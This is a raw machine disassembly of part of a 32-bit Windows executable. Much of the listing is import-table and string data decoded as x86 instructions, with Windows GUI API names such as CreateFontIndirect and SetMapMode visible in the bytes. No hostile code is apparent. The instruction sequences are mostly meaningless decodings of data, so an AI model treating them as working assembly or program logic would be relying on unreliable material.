  4137ad:	arpl   WORD PTR [ebp+0x43],sp
  4137b0:	popa   
  4137b1:	jo     0x413826
  4137b3:	add    BYTE PTR [ecx],ah
  4137b5:	add    DWORD PTR [edi+0x65],eax
  4137b8:	je     0x4137fc
  4137ba:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4137c2:	jae    0x4137c4
  4137c4:	mov    DWORD PTR [ecx],0x65766153
  4137ca:	inc    esp
  4137cb:	inc    ebx
  4137cc:	add    BYTE PTR [eax],al
  4137ce:	jne    0x4137d0
  4137d0:	inc    edx
  4137d1:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4137da:	add    DWORD PTR [ecx],0x47
  4137dd:	gs je  0x413834
  4137e0:	gs js  0x413857
  4137e3:	inc    ebp
  4137e4:	js     0x41385a
  4137e6:	outs   dx,BYTE PTR gs:[esi]
  4137e8:	je     0x41383a
  4137ea:	outs   dx,DWORD PTR ds:[esi]
  4137eb:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4137f2:	stos   BYTE PTR es:[edi],al
  4137f3:	add    BYTE PTR [ebx+0x72],al
  4137f6:	gs popa 
  4137f8:	je     0x41385f
  4137fa:	push   eax
  4137fb:	outs   dx,DWORD PTR ds:[esi]
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	jns    0x413866
  4137ff:	outs   dx,DWORD PTR ds:[esi]
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	push   edx
  413802:	outs   dx,BYTE PTR ds:[si]
  413804:	add    BYTE PTR [eax],al
  413806:	xchg   ebx,eax
  413807:	add    BYTE PTR [ebx+0x72],al
  41380a:	gs popa 
  41380c:	je     0x413873
  41380e:	inc    esp
  41380f:	dec    ecx
  413810:	inc    edx
  413811:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb6000070
  413819:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  41381d:	gs je  0x413885
  413820:	dec    edi
  413821:	bound  ebp,QWORD PTR [edx+0x65]
  413824:	arpl   WORD PTR [eax+eax*1+0x0],si
  413828:	outs   dx,BYTE PTR ds:[esi]
  413829:	add    DWORD PTR [edi+0x65],eax
  41382c:	je     0x41387e
  41382e:	imul   edi,DWORD PTR [eax+0x65],0x8900006c
  413835:	add    BYTE PTR [ebx+0x72],al
  413838:	gs popa 
  41383a:	je     0x4138a1
  41383c:	inc    edx
  41383d:	jb     0x4138b4
  41383f:	jae    0x4138a9
  413841:	dec    ecx
  413842:	outs   dx,BYTE PTR ds:[esi]
  413843:	imul   esi,DWORD PTR fs:[edx+0x65],0x8a007463
  41384b:	add    DWORD PTR [edi+0x65],eax
  41384e:	je     0x4138a4
  413850:	gs js  0x4138c7
  413853:	dec    ebp
  413854:	gs je  0x4138c9
  413857:	imul   esp,DWORD PTR [ebx+0x73],0x870041
  41385e:	inc    ebx
  41385f:	jb     0x4138c6
  413861:	popa   
  413862:	je     0x4138c9
  413864:	inc    edx
  413865:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd3000070
  41386d:	add    DWORD PTR [ebx+0x65],edx
  413870:	je     0x4138b4
  413872:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  41387a:	outs   dx,BYTE PTR gs:[esi]
  41387c:	jae    0x4138e7
  41387e:	outs   dx,DWORD PTR ds:[esi]
  41387f:	outs   dx,BYTE PTR ds:[esi]
  413880:	inc    ebp
  413881:	js     0x413883
  413883:	add    BYTE PTR [edx+0x65724300],bl
  413889:	popa   
  41388a:	je     0x4138f1
  41388c:	inc    esi
  41388d:	outs   dx,DWORD PTR ds:[esi]
  41388e:	outs   dx,BYTE PTR ds:[esi]
  41388f:	je     0x4138da
  413891:	outs   dx,BYTE PTR ds:[esi]
  413892:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41389a:	iret   
  41389b:	add    DWORD PTR [ebx+0x65],edx
  41389e:	ins    BYTE PTR es:[edi],dx
  41389f:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4138a4:	ins    BYTE PTR es:[edi],dx
  4138a5:	gs je  0x41391c
  4138a8:	gs add dh,al
  4138ab:	add    DWORD PTR [edx+0x6f],edx
  4138ae:	jne    0x41391e
  4138b0:	fs push edx
  4138b2:	arpl   WORD PTR gs:[eax+eax*1-0x50],si
  4138b7:	add    BYTE PTR [ebx+0x72],al
  4138ba:	gs popa 
  4138bc:	je     0x413923
  4138be:	push   ebx
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	ins    BYTE PTR es:[edi],dx
  4138c1:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  4138c9:	add    BYTE PTR [edx],bh
  4138cb:	add    DWORD PTR [edi+0x65],eax
  4138ce:	je     0x413913
  4138d0:	jne    0x413944
  4138d2:	jb     0x413939
  4138d4:	outs   dx,BYTE PTR ds:[esi]
  4138d5:	je     0x413926
  4138d7:	bound  ebp,QWORD PTR [edx+0x65]
  4138da:	arpl   WORD PTR [eax+eax*1+0x0],si
  4138de:	stos   DWORD PTR es:[edi],eax
  4138df:	add    BYTE PTR [ebx+0x72],al
  4138e2:	gs popa 
  4138e4:	je     0x41394b
  4138e6:	push   edx
  4138e7:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  4138ec:	outs   dx,BYTE PTR ds:[esi]
  4138ed:	add    al,dl
  4138ef:	add    DWORD PTR [ebx+0x65],edx
  4138f2:	je     0x413935
  4138f4:	bound  ebp,QWORD PTR [edi+0x72]
  4138f7:	je     0x413949
  4138f9:	jb     0x41396a
  4138fb:	arpl   WORD PTR [eax],ax
  4138fd:	add    ah,cl
  4138ff:	add    DWORD PTR [ebx+0x65],edx
  413902:	ins    BYTE PTR es:[edi],dx
  413903:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  413908:	imul   esi,DWORD PTR [eax+0x52],0x9e006e67
  41390f:	add    BYTE PTR [ebx+0x72],al
  413912:	gs popa 
  413914:	je     0x41397b
  413916:	inc    esi
  413917:	outs   dx,DWORD PTR ds:[esi]
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	je     0x413972
  41391b:	add    bh,al
  41391d:	add    BYTE PTR [ebp+0x6e],al
  413920:	jne    0x41398f
  413922:	inc    esi
  413923:	outs   dx,DWORD PTR ds:[esi]
  413924:	outs   dx,BYTE PTR ds:[esi]
  413925:	je     0x41399a
  413927:	push   edi
  413928:	add    BYTE PTR [eax],al
  41392a:	dec    ebx
  41392b:	add    DWORD PTR [edi+0x65],eax
  41392e:	je     0x413976
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	outs   dx,BYTE PTR ds:[esi]
  413932:	je     0x413978
  413934:	popa   
  413935:	je     0x413998
  413937:	add    BYTE PTR [ebp+0x766f4d01],bl
  41393d:	gs push esp
  41393f:	outs   dx,DWORD PTR ds:[esi]
  413940:	inc    ebp
  413941:	js     0x413943
  413943:	add    BYTE PTR [ecx+eax*1+0x47],ch
  413947:	gs je  0x41399a
  41394a:	popa   
  41394b:	ins    BYTE PTR es:[edi],dx
  41394c:	gs je  0x4139c3
  41394f:	gs inc ebp
  413951:	outs   dx,BYTE PTR ds:[esi]
  413952:	je     0x4139c6
  413954:	imul   esp,DWORD PTR [ebp+0x73],0x54020c00
  41395b:	gs js  0x4139d2
  41395e:	dec    edi
  41395f:	jne    0x4139d5
  413961:	push   edi
  413962:	add    BYTE PTR [eax],al
  413964:	rol    BYTE PTR [ecx],cl
  413966:	push   ebx
  413967:	gs je  0x4139ac
  41396a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  413972:	jae    0x413974
  413974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413975:	add    DWORD PTR [eax+0x61],edx
  413978:	je     0x4139bc
  41397a:	ins    BYTE PTR es:[edi],dx
  41397b:	je     0x41397d
  41397d:	add    BYTE PTR [ecx+0x66664f01],ah
  413983:	jae    0x4139ea
  413985:	je     0x4139dd
  413987:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41398e:	dec    edi
  41398f:	jb     0x4139f8
  413991:	inc    ebp
  413992:	js     0x413994
  413994:	xlat   BYTE PTR ds:[ebx]
  413995:	add    BYTE PTR [esi+0x69],al
  413998:	ins    BYTE PTR es:[edi],dx
  413999:	ins    BYTE PTR es:[edi],dx
  41399a:	push   edx
  41399b:	outs   dx,BYTE PTR ds:[si]
  41399d:	add    BYTE PTR [esi+0x65724300],dl
  4139a3:	popa   
  4139a4:	je     0x413a0b
  4139a6:	inc    ebp
  4139a7:	ins    BYTE PTR es:[edi],dx
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4139b0:	outs   dx,BYTE PTR ds:[esi]
  4139b1:	dec    ecx
  4139b2:	outs   dx,BYTE PTR ds:[esi]
  4139b3:	imul   esi,DWORD PTR fs:[edx+0x65],0x87007463
  4139bb:	add    DWORD PTR [edi+0x65],eax
  4139be:	je     0x413a14
  4139c0:	gs js  0x413a37
  4139c3:	inc    ebp
  4139c4:	js     0x413a3a
  4139c6:	outs   dx,BYTE PTR gs:[esi]
  4139c8:	je     0x413a1a
  4139ca:	outs   dx,DWORD PTR ds:[esi]
  4139cb:	imul   ebp,DWORD PTR [esi+0x74],0x1c40057
  4139d2:	push   edx
  4139d3:	gs jae 0x413a3f
  4139d6:	jp     0x413a3d
  4139d8:	push   eax
  4139d9:	popa   
  4139da:	ins    BYTE PTR es:[edi],dx
  4139db:	gs je  0x413a52
  4139de:	gs add bh,dl
  4139e1:	add    DWORD PTR [ebx+0x65],edx
  4139e4:	je     0x413a28
  4139e6:	jb     0x413a5d
  4139e8:	jae    0x413a52
  4139ea:	dec    edi
  4139eb:	jb     0x413a54
  4139ed:	inc    ebp
  4139ee:	js     0x4139f0
  4139f0:	mov    al,ds:0x66664f01
  4139f5:	jae    0x413a5c
  4139f7:	je     0x413a4b
  4139f9:	outs   dx,BYTE PTR ds:[si]
  4139fb:	add    BYTE PTR [ebx],cl
  4139fd:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  413a01:	je     0x413a52
  413a03:	jne    0x413a79
  413a05:	inc    ecx
  413a06:	add    BYTE PTR [eax],al
  413a08:	mov    eax,0x61655201
  413a0d:	ins    BYTE PTR es:[edi],dx
  413a0e:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  413a15:	je     0x413a8b
  413a17:	add    BYTE PTR gs:[eax],al
  413a1a:	inc    edi
  413a1b:	inc    esp
  413a1c:	dec    ecx
  413a1d:	xor    esi,DWORD PTR [edx]
  413a1f:	cs fs ins BYTE PTR es:[edi],dx
  413a22:	ins    BYTE PTR es:[edi],dx
  413a23:	add    BYTE PTR [esi+0x0],al
  413a26:	push   eax
  413a27:	popa   
  413a28:	je     0x413a92
  413a2a:	inc    esi
  413a2b:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413a32:	outs   dx,BYTE PTR ds:[esi]
  413a33:	jae    0x413a9e
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	outs   dx,BYTE PTR ds:[esi]
  413a37:	inc    ecx
  413a38:	add    BYTE PTR [eax],al
  413a3a:	push   ebx
  413a3b:	dec    eax
  413a3c:	dec    esp
  413a3d:	push   edi
  413a3e:	inc    ecx
  413a3f:	push   eax
  413a40:	dec    ecx
  413a41:	cs fs ins BYTE PTR es:[edi],dx
  413a44:	ins    BYTE PTR es:[edi],dx
  413a45:	add    BYTE PTR [ebp+0x6b],dh
  413a48:	popa   
  413a49:	jns    0x413a90
  413a4b:	pop    ecx
  413a4c:	je     0x413a96
  413a4e:	push   edx
  413a4f:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413a56:	call   0x413e:0xa200413e
  413a5d:	add    BYTE PTR [esi-0x17ffbec4],bl
  413a63:	or     esi,DWORD PTR [edx-0x3db086f2]
  413a69:	dec    esi
  413a6a:	ja     0x413abb
  413a6c:	cmp    eax,0x384f4f4f
  413a71:	dec    edi
  413a72:	jp     0x413ac3
  413a74:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a77:	dec    edi
  413a78:	ss dec edi
  413a7a:	add    ecx,DWORD PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	ret    0x324e
  413a81:	dec    edi
  413a82:	push   ds
  413a83:	push   edx
  413a84:	pop    ds
  413a85:	push   ebx
  413a86:	cmp    DWORD PTR [edi+0x79],ecx
  413a89:	dec    edi
  413a8a:	ret    0x774e
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x384f4f4f
  413a93:	dec    edi
  413a94:	jp     0x413ae5
  413a96:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a99:	dec    edi
  413a9a:	ss dec edi
  413a9c:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  413aa3:	dec    edi
  413aa4:	push   ds
  413aa5:	bound  ebx,QWORD PTR [edi]
  413aa7:	arpl   WORD PTR [ecx],di
  413aa9:	dec    edi
  413aaa:	jns    0x413afb
  413aac:	ret    0x724e
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f034f
  413ab5:	dec    edi
  413ab6:	dec    esp
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	jb     0x413ae0
  413ac1:	jae    0x413ad2
  413ac3:	or     DWORD PTR [eax],0xffffff80
  413ac6:	js     0x413a58
  413ac8:	jns    0x413a5b
  413aca:	aas    
  413acb:	dec    edi
  413acc:	jbe    0x413b1d
  413ace:	ret    0x764e
  413ad1:	dec    edi
  413ad2:	ds dec edi
  413ad4:	dec    esp
  413ad5:	dec    edi
  413ad6:	cmp    DWORD PTR [edi+0x3],ecx
  413ad9:	dec    edi
  413ada:	xor    eax,0x364ec24f
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	sbb    BYTE PTR [edi],0x83
  413ae4:	setae  BYTE PTR [eax]
  413ae7:	nop
  413ae8:	js     0x413a8a
  413aea:	jns    0x413a8d
  413aec:	aas    
  413aed:	dec    edi
  413aee:	jbe    0x413b3f
  413af0:	ret    0x764e
  413af3:	dec    edi
  413af4:	ds dec edi
  413af6:	dec    esp
  413af7:	dec    edi
  413af8:	cmp    DWORD PTR [edi+0x69],ecx
  413afb:	dec    edi
  413afc:	xor    eax,0x364ec24f
  413b01:	dec    edi
  413b02:	push   ds
  413b03:	xchg   edx,eax
  413b04:	pop    ds
  413b05:	xchg   ebx,eax
  413b06:	bt     DWORD PTR [eax],ecx
  413b09:	mov    al,ds:0xb179b078
  413b0e:	aas    
  413b0f:	dec    edi
  413b10:	push   0x4e4ec24f
  413b15:	dec    edi
  413b16:	cmp    eax,0x394f034f
  413b1b:	dec    edi
  413b1c:	push   ecx
  413b1d:	dec    edi
  413b1e:	xor    al,0x4f
  413b20:	ret    0x364e
  413b23:	dec    edi
  413b24:	push   ds
  413b25:	mov    ds:0xb30fa31f,al
  413b2a:	or     BYTE PTR [eax-0x3e863f88],dh
  413b30:	aas    
  413b31:	dec    edi
  413b32:	push   0x4e4ec24f
  413b37:	dec    edi
  413b38:	cmp    eax,0x394f784f
  413b3d:	dec    edi
  413b3e:	pop    edi
  413b3f:	dec    edi
  413b40:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b43:	dec    esi
  413b44:	xor    eax,0x1fb21e4f
  413b49:	mov    bl,0xf
  413b4b:	ret    
  413b4c:	or     al,al
  413b4e:	js     0x413b20
  413b50:	jns    0x413b23
  413b52:	aas    
  413b53:	dec    edi
  413b54:	push   0x4e4ec24f
  413b59:	dec    edi
  413b5a:	cmp    eax,0x394f724f
  413b5f:	dec    edi
  413b60:	dec    esi
  413b61:	dec    edi
  413b62:	xor    al,0x4f
  413b64:	ret    0x304e
  413b67:	dec    edi
  413b68:	push   ds
  413b69:	ret    0xc31f
  413b6c:	psrlq  mm1,QWORD PTR [eax]
  413b6f:	sar    BYTE PTR [eax-0x20],1
  413b72:	jns    0x413b55
  413b74:	aas    
  413b75:	dec    edi
  413b76:	push   0x4e4ec24f
  413b7b:	dec    edi
  413b7c:	cmp    eax,0x394f734f
  413b81:	dec    edi
  413b82:	dec    esp
  413b83:	dec    edi
  413b84:	xor    al,0x4f
  413b86:	ret    0x364e
  413b89:	dec    edi
  413b8a:	push   ds
  413b8b:	rcr    BYTE PTR [edi],cl
  413b8d:	ror    DWORD PTR [edi],cl
  413b8f:	jecxz  0x413b99
  413b91:	loopne 0x413c0b
  413b93:	lock jns 0x413b87
  413b96:	aas    
  413b97:	dec    edi
  413b98:	ins    DWORD PTR es:[edi],dx
  413b99:	dec    edi
  413b9a:	ret    0x5f4e
  413b9d:	dec    edi
  413b9e:	cmp    eax,0x3e4f524f
  413ba3:	dec    edi
  413ba4:	ret    0x3f4e
  413ba7:	dec    edi
  413ba8:	push   ds
  413ba9:	loop   0x413bca
  413bab:	jecxz  0x413bbc
  413bad:	repz or al,dh
  413bb0:	js     0x413bb2
  413bb2:	jns    0x413bb5
  413bb4:	js     0x413bc6
  413bb6:	jns    0x413bc9
  413bb8:	ds dec edi
  413bba:	jg     0x413c0b
  413bbc:	ret    0x5b4e
  413bbf:	dec    edi
  413bc0:	cmp    al,0x4f
  413bc2:	jb     0x413c13
  413bc4:	ds dec edi
  413bc6:	dec    ebp
  413bc7:	dec    edi
  413bc8:	cmp    ecx,DWORD PTR [edi-0x3e]
  413bcb:	dec    esi
  413bcc:	xor    eax,0x1f021e4f
  413bd1:	add    ecx,DWORD PTR [edi]
  413bd3:	adc    ecx,DWORD PTR [eax]
  413bd5:	adc    BYTE PTR [eax+0x20],bh
  413bd8:	jns    0x413bfb
  413bda:	aas    
  413bdb:	dec    edi
  413bdc:	add    BYTE PTR [eax],al
  413bde:	data16 cmp al,BYTE PTR [ecx+0x0]
  413be2:	pop    edx
  413be3:	cmp    al,0x41
  413be5:	add    BYTE PTR [edx+0x3c],ah
  413be8:	inc    ecx
  413be9:	add    BYTE PTR [esi+0xe00413e],ah
  413bef:	ds inc ecx
  413bf1:	add    BYTE PTR [esi+0x4200413e],dl
  413bf7:	cmp    al,0x41
  413bf9:	add    BYTE PTR [esi+0x3c],al
  413bfc:	inc    ecx
  413bfd:	add    BYTE PTR [esi-0x55ffbec2],cl
  413c03:	cmp    al,0x41
  413c05:	add    BYTE PTR [edx-0x4e076357],cl
  413c0b:	mov    edx,0x3c5ef89c
  413c10:	inc    ecx
  413c11:	add    dh,al
  413c13:	cmp    eax,0x3dda0041
  413c18:	inc    ecx
  413c19:	add    dh,ah
  413c1b:	cmp    eax,0x3df60041
  413c20:	inc    ecx
  413c21:	add    BYTE PTR [esi+0x6200413c],dl
  413c27:	cmp    al,BYTE PTR [ecx+0x0]
  413c2a:	mov    dh,0x3c
  413c2c:	inc    ecx
  413c2d:	add    BYTE PTR [esi-0x55ffbec4],ah
  413c33:	ds inc ecx
  413c35:	add    BYTE PTR [ecx],dh
  413c37:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413c3e:	push   0x3c
  413c40:	inc    ecx
  413c41:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413c47:	or     eax,0x705
  413c4c:	inc    eax
  413c4d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413c51:	fisttp QWORD PTR [ebx+0x72004337]
  413c57:	push   0xfa8f4145
  413c5c:	jne    0x413cc0
  413c5e:	(bad)  
  413c5f:	in     eax,dx
  413c60:	inc    BYTE PTR [edi]
  413c62:	mov    eax,0x5205a3fa
  413c67:	cmp    al,0x41
  413c69:	add    BYTE PTR [edx],dh
  413c6b:	xchg   ebp,eax
  413c6c:	pushf  
  413c6d:	clc    
  413c6e:	xor    dl,BYTE PTR [esi-0x6acc0764]
  413c74:	pushf  
  413c75:	clc    
  413c76:	cmp    al,0x95
  413c78:	pushf  
  413c79:	clc    
  413c7a:	cmp    eax,0x3ef89c95
  413c7f:	xchg   ebp,eax
  413c80:	pushf  
  413c81:	clc    
  413c82:	aas    
  413c83:	xchg   ebp,eax
  413c84:	pushf  
  413c85:	clc    
  413c86:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413c8c:	pushf  
  413c8d:	clc    
  413c8e:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413c94:	pushf  
  413c95:	clc    
  413c96:	in     eax,dx
  413c97:	stc    
  413c98:	add    esp,DWORD PTR [eax+0x5a]
  413c9b:	cmp    al,BYTE PTR [ecx+0x0]
  413c9e:	push   esi
  413c9f:	add    al,BYTE PTR [ebx+0x0]
  413ca2:	pop    ecx
  413ca3:	dec    ecx
  413ca4:	imul   si,WORD PTR [ecx],0xff85
  413ca8:	pushf  
  413ca9:	clc    
  413caa:	sahf   
  413cab:	jmp    0x5b54400
  413cb0:	add    BYTE PTR [eax],al
  413cb2:	push   esi
  413cb3:	cmp    al,BYTE PTR [ecx+0x0]
  413cb6:	pushf  
  413cb7:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413cea:	jecxz  0x413c7b
  413cec:	inc    eax
  413ced:	add    BYTE PTR [esi+0x12],bh
  413cf0:	inc    ebx
  413cf1:	add    BYTE PTR [eax],al
  413cf3:	add    BYTE PTR [eax],al
  413cf5:	add    BYTE PTR [eax+eax*1+0x46],al
  413cf9:	add    BYTE PTR [ecx+0x0],ch
  413cfc:	outs   dx,DWORD PTR ds:[esi]
  413cfd:	add    BYTE PTR [edx+0x0],cl
  413d00:	dec    ecx
  413d01:	add    BYTE PTR [eax+eax*1+0x46],al
  413d05:	add    BYTE PTR [eax+eax*1+0x49],cl
  413d09:	add    BYTE PTR [ebp+0x0],dl
  413d0c:	inc    esi
  413d0d:	add    BYTE PTR [edi+0x0],cl
  413d10:	imul   eax,DWORD PTR [eax],0x6f
  413d13:	add    BYTE PTR [edx+0x0],ch
  413d16:	dec    ebx
  413d17:	add    BYTE PTR [eax+eax*1+0x66],cl
  413d1b:	add    BYTE PTR [edx+0x0],ch
  413d1e:	imul   eax,DWORD PTR [eax],0x46006f
  413d24:	jo     0x413d26
  413d26:	outs   dx,DWORD PTR ds:[esi]
  413d27:	add    BYTE PTR [ebx+0x0],ch
  413d2a:	ins    DWORD PTR es:[edi],dx
  413d2b:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413d2f:	add    BYTE PTR [ebx+0x0],dh
  413d32:	ins    BYTE PTR es:[edi],dx
  413d33:	add    BYTE PTR [edx+0x0],ch
  413d36:	data16 add BYTE PTR [edi+0x0],ah
  413d3a:	imul   eax,DWORD PTR [eax],0x64006f
  413d40:	add    BYTE PTR [di+0x0],dh
  413d44:	imul   eax,DWORD PTR [eax],0x69006a
  413d4a:	outs   dx,DWORD PTR ds:[esi]
  413d4b:	add    BYTE PTR [esi+0x0],ah
  413d4e:	add    BYTE PTR fs:[ebp+0x0],dh
  413d52:	push   0x0
  413d54:	add    BYTE PTR [bp+0x0],ah
  413d58:	add    BYTE PTR fs:[eax],al
  413d5b:	add    BYTE PTR [eax],al
  413d5d:	add    BYTE PTR [ebx+0x4a],cl
  413d60:	inc    esp
  413d61:	dec    esp
  413d62:	dec    edx
  413d63:	imul   ecx,DWORD PTR [ebx+ecx*2+0x49],0x55
  413d68:	inc    esp
  413d69:	dec    ecx
  413d6a:	dec    ecx
  413d6b:	inc    esp
  413d6c:	dec    edi
  413d6d:	jne    0x413dd3
  413d6f:	dec    ecx
  413d70:	dec    esp
  413d71:	push   ebp
  413d72:	imul   ebp,DWORD PTR fs:[edi+0x55],0x6a49444b
  413d7a:	imul   ebp,DWORD PTR [esp+eiz*2+0x4b],0x4a
  413d7f:	inc    esp
  413d80:	imul   ebp,DWORD PTR [esp+eax*2+0x4c],0x444a494b
  413d88:	ins    BYTE PTR es:[edi],dx
  413d89:	imul   ebp,DWORD PTR [edx+0x64],0x4c
  413d8d:	dec    ebx
  413d8e:	push   ebp
  413d8f:	inc    esp
  413d90:	outs   dx,DWORD PTR ds:[esi]
  413d91:	imul   esi,DWORD PTR [ebp+0x6a],0x4a6b6c64
  413d98:	dec    esp
  413d99:	dec    ebx
  413d9a:	inc    esp
  413d9b:	dec    edx
  413d9c:	dec    edi
  413d9d:	sub    al,BYTE PTR [ebp+edx*2+0x4c]
  413da1:	inc    esp
  413da2:	inc    esp
  413da3:	add    BYTE PTR [eax],al
  413da5:	add    BYTE PTR [esi+0x6b],ah
  413da8:	fs jae 0x413e12
  413dab:	addr16 data16 fs addr16 fs data16 addr16 data16 fs data16 add BYTE PTR fs:[bx+si],al
	...
  413dc1:	add    BYTE PTR [ecx+0x550040c0],bl
  413dc7:	dec    edi
  413dc8:	pop    edi
  413dc9:	dec    edi
  413dca:	dec    esp
  413dcb:	dec    edi
  413dcc:	push   eax
  413dcd:	dec    edi
  413dce:	pop    edi
  413dcf:	dec    edi
  413dd0:	push   esi
  413dd1:	dec    edi
  413dd2:	or     eax,0xc24f0c4f
  413dd7:	dec    esi
  413dd8:	add    BYTE PTR [eax],al
  413dda:	pop    ecx
  413ddb:	dec    edi
  413ddc:	pop    esi
  413ddd:	dec    edi
  413dde:	pop    ebx
  413ddf:	dec    edi
  413de0:	or     eax,0xc24f0c4f
  413de5:	dec    esi
  413de6:	dec    edi
  413de7:	dec    edi
  413de8:	dec    ebp
  413de9:	dec    edi
  413dea:	pop    edi
  413deb:	dec    edi
  413dec:	dec    esp
  413ded:	dec    edi
  413dee:	or     eax,0xc24f0c4f
  413df3:	dec    esi
  413df4:	add    BYTE PTR [eax],al
  413df6:	dec    ebp
  413df7:	dec    edi
  413df8:	pop    edx
  413df9:	dec    edi
  413dfa:	push   esi
  413dfb:	dec    edi
  413dfc:	dec    ecx
  413dfd:	dec    edi
  413dfe:	arpl   WORD PTR [edi+0x52],cx
  413e01:	dec    edi
  413e02:	pop    ebx
  413e03:	dec    edi
  413e04:	ret    0x4e
  413e07:	add    BYTE PTR [eax],al
  413e09:	add    BYTE PTR [eax],al
  413e0b:	add    BYTE PTR [eax],al
  413e0d:	add    BYTE PTR [esi+0x7d],ch
  413e10:	outs   dx,BYTE PTR ds:[esi]
  413e11:	lea    ebp,[esi-0x63]
  413e14:	outs   dx,BYTE PTR ds:[esi]
  413e15:	lods   eax,DWORD PTR ds:[esi]
  413e16:	outs   dx,BYTE PTR ds:[esi]
  413e17:	mov    ebp,0xdd6ecd6e
  413e1c:	outs   dx,BYTE PTR ds:[esi]
  413e1d:	in     eax,dx
  413e1e:	outs   dx,BYTE PTR ds:[esi]
  413e1f:	std    
  413e20:	outs   dx,BYTE PTR ds:[esi]
  413e21:	or     eax,0x2d6e1d6e
  413e26:	outs   dx,BYTE PTR ds:[esi]
  413e27:	cmp    eax,0x6d6e5d6e
  413e2c:	outs   dx,BYTE PTR ds:[esi]
  413e2d:	jb     0x413e9d
  413e2f:	jae    0x413e9f
  413e31:	jo     0x413ea1
  413e33:	jno    0x413ea3
  413e35:	jbe    0x413ea5
  413e37:	ja     0x413ea7
  413e39:	je     0x413ea9
  413e3b:	jne    0x413eab
  413e3d:	mov    ch,BYTE PTR [esi-0x75]
  413e40:	outs   dx,BYTE PTR ds:[esi]
  413e41:	mov    BYTE PTR [esi-0x77],ch
  413e44:	outs   dx,BYTE PTR ds:[esi]
  413e45:	mov    gs,WORD PTR [esi+0x7c]
  413e48:	pop    esi
  413e49:	jge    0x413e99
  413e4b:	jge    0x413e0b
  413e4d:	jge    0x413ea7
  413e4f:	(bad)  
  413e50:	jns    0x413ec2
  413e52:	mov    ecx,0x7d736eb1
  413e57:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413e5d:	add    BYTE PTR [ecx+0x17],cl
  413e60:	mov    ebx,0x4af4b956
  413e65:	aaa    
  413e66:	dec    edx
  413e67:	jle    0x413e02
  413e69:	jno    0x413ecb
  413e6b:	mov    cl,0x4
  413e6d:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413e74:	inc    esp
  413e75:	xlat   BYTE PTR ds:[ebx]
  413e76:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413e7c:	rcr    esi,cl
  413e7e:	(bad)  
  413e7f:	leave  
  413e80:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413e86:	fs icebp 
  413e88:	push   eax
  413e89:	(bad)  
  413e8a:	rcr    DWORD PTR [eax],1
  413e8c:	shl    DWORD PTR [ecx-0x11],1
  413e8f:	(bad)  [ebx+0x7]
  413e92:	mov    dl,0x3c
  413e94:	inc    ecx
  413e95:	add    BYTE PTR [esi+0x30],al
  413e98:	shl    DWORD PTR [ebx],0xb8
  413e9b:	and    DWORD PTR [ecx+0x0],eax
  413e9e:	inc    esi
  413e9f:	push   ebx
  413ea0:	outs   dx,DWORD PTR ds:[esi]
  413ea1:	push   ebx
  413ea2:	dec    edx
  413ea3:	cmp    al,0x41
  413ea5:	add    BYTE PTR [esi-0x70ffbec4],ch
  413eab:	in     eax,dx
  413eac:	adc    al,BYTE PTR [edi]
	...
  413ece:	inc    ecx
  413ecf:	inc    edi
  413ed0:	jae    0x413f3b
  413ed2:	inc    edx
  413ed3:	jae    0x413f3a
  413ed5:	popa   
  413ed6:	push   ecx
  413ed7:	pop    eax
  413ed8:	pop    ecx
  413ed9:	outs   dx,BYTE PTR ds:[esi]
  413eda:	jbe    0x413f54
  413edc:	jns    0x413f32
  413ede:	push   ecx
  413edf:	imul   ebp,DWORD PTR [ebx+0x74],0x61
  413ee3:	jns    0x413f34
  413ee5:	inc    ebx
  413ee6:	jo     0x413f5a
  413ee8:	data16 jp 0x413f3d
  413eeb:	jp     0x413f45
  413eed:	ins    BYTE PTR es:[edi],dx
  413eee:	je     0x413f5f
  413ef0:	jns    0x413f60
  413ef2:	popa   
  413ef3:	push   esi
  413ef4:	push   ebp
  413ef5:	push   0x0
	...
